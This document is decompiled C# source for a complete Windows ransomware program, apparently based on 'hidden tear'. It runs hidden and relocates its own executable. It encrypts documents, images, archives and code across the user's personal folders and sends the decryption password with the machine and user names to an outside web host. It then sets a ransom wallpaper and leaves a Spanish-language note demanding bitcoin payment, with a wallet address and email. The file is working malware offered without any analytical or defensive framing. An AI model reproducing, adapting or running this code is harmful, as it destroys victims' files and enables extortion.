using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace hidden_tear;

public class Form1 : Form
{
	private string targetURL = "https://pruebame123.000webhostapp.com/Ransomware/write.php?info=";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\";

	private string backgroundImageUrl = "https://pruebame123.000webhostapp.com/Ransomware/Ransom.jpg";

	private IContainer components = null;

	internal PictureBox PictureBox3;

	internal Label Label2;

	internal Label Label1;

	internal PictureBox PictureBox1;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		string text = computerName + "-" + userName + " " + password;
		string address = targetURL + text;
		new WebClient().DownloadString(address);
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		string text = "Users\\";
		string text2 = text + userName + "\\Desktop\\READ_IT.txt.locked";
		string path = userDir + text2;
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".crack");
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[66]
			{
				".txt", ".jar", ".exe", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx",
				".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".sln",
				".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".c",
				".cs", ".mp3", ".mp4", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi",
				".apk", ".lnk", ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh",
				".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj",
				".pdb", ".ico", ".pas", ".db", ".torrent", ".rar"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j], password);
			}
		}
		catch (Exception)
		{
		}
	}

	public void MoveVirus()
	{
		string path = userDir + userName + "\\Rand123";
		string text = userDir + userName + "\\Rand123\\local.exe";
		if (!Directory.Exists(path))
		{
			Directory.CreateDirectory(path);
		}
		else if (File.Exists(text))
		{
			File.Delete(text);
		}
		string text2 = "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
		string text3 = Directory.GetCurrentDirectory() + text2;
		string sourceFileName = text3;
		File.Move(sourceFileName, text);
	}

	public static bool CheckForInternetConnection()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("https://www.google.com"))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}

	public void startAction()
	{
		MoveVirus();
		string password = CreatePassword(15);
		Directory_Settings_Sending(password);
		messageCreator();
		string path = userDir + userName + "\\ransom.jpg";
		bool flag;
		do
		{
			if (flag = CheckForInternetConnection())
			{
				SetWallpaperFromWeb(backgroundImageUrl, path);
				SendPassword(password);
			}
		}
		while (!flag);
		password = null;
		Application.Exit();
	}

	public void Directory_Settings_Sending(string password)
	{
		string text = "Users\\";
		string location = userDir + text + userName + "\\Desktop";
		string location2 = userDir + text + userName + "\\Links";
		string location3 = userDir + text + userName + "\\Contacts";
		string location4 = userDir + text + userName + "\\Desktop";
		string location5 = userDir + text + userName + "\\Documents";
		string location6 = userDir + text + userName + "\\Downloads";
		string location7 = userDir + text + userName + "\\Pictures";
		string location8 = userDir + text + userName + "\\Music";
		string location9 = userDir + text + userName + "\\OneDrive";
		string location10 = userDir + text + userName + "\\Saved Games";
		string location11 = userDir + text + userName + "\\Favorites";
		string location12 = userDir + text + userName + "\\Searches";
		string location13 = userDir + text + userName + "\\Videos";
		encryptDirectory(location, password);
		encryptDirectory(location2, password);
		encryptDirectory(location3, password);
		encryptDirectory(location4, password);
		encryptDirectory(location5, password);
		encryptDirectory(location6, password);
		encryptDirectory(location7, password);
		encryptDirectory(location8, password);
		encryptDirectory(location9, password);
		encryptDirectory(location10, password);
		encryptDirectory(location11, password);
		encryptDirectory(location12, password);
		encryptDirectory(location13, password);
	}

	public void messageCreator()
	{
		string text = "\\Desktop\\PAGO.txt";
		string path = userDir + "Users\\" + userName + text;
		_ = computerName + "-" + userName;
		string[] contents = new string[10] { "Tu computador ha sido hackeado y encriptado by ANONCRACK ...!", " ", "¿COMO RECUPERAR TUS ARCHIVOS?", " ", "1. Realiza el pago de 30 USD ha esta direccion bitcoin : 1CvWhugm6QbHisVvhyRuKn81kQgVVs4ov8", "2. Envia una captura del pago y nombre de tu PC ha este correo: anoncrack@protonmail.com", "3. Una vez verificado tu pago, te enviaremos la KEY de DESENCRIPTACION", "4. Disfruta de tus archivos personales", " ", "Tus amigos ANONCRACK ;)" };
		File.WriteAllLines(path, contents);
	}

	public void SetWallpaper(string path)
	{
		SystemParametersInfo(20u, 0u, path, 3u);
	}

	private void SetWallpaperFromWeb(string url, string path)
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(new Uri(url), path);
			SetWallpaper(path);
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_01a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b0: Expected O, but got Unknown
		//IL_0238: Unknown result type (might be due to invalid IL or missing references)
		//IL_0242: Expected O, but got Unknown
		//IL_0337: Unknown result type (might be due to invalid IL or missing references)
		//IL_0341: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		PictureBox3 = new PictureBox();
		Label2 = new Label();
		Label1 = new Label();
		PictureBox1 = new PictureBox();
		((ISupportInitialize)PictureBox3).BeginInit();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		PictureBox3.set_Image((Image)componentResourceManager.GetObject("PictureBox3.Image"));
		PictureBox3.set_ImeMode((ImeMode)0);
		((Control)PictureBox3).set_Location(new Point(1, 0));
		((Control)PictureBox3).set_Name("PictureBox3");
		((Control)PictureBox3).set_Size(new Size(140, 131));
		PictureBox3.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox3.set_TabIndex(13);
		PictureBox3.set_TabStop(false);
		((Control)Label2).set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Engravers MT", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.FromArgb(192, 0, 0));
		Label2.set_ImeMode((ImeMode)0);
		((Control)Label2).set_Location(new Point(191, 9));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(297, 37));
		((Control)Label2).set_TabIndex(14);
		((Control)Label2).set_Text("atención !!!");
		((Control)Label1).set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Courier New", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(SystemColors.ControlLightLight);
		Label1.set_ImeMode((ImeMode)0);
		((Control)Label1).set_Location(new Point(174, 70));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(417, 44));
		((Control)Label1).set_TabIndex(16);
		((Control)Label1).set_Text("Todos los archivos de tu computadora \r\nhan sido ENCRIPTADOS...");
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		((Control)PictureBox1).set_Location(new Point(151, 151));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(326, 132));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(15);
		PictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ActiveCaptionText);
		((Form)this).set_ClientSize(new Size(616, 343));
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)PictureBox3);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("hidden tear");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)PictureBox3).EndInit();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
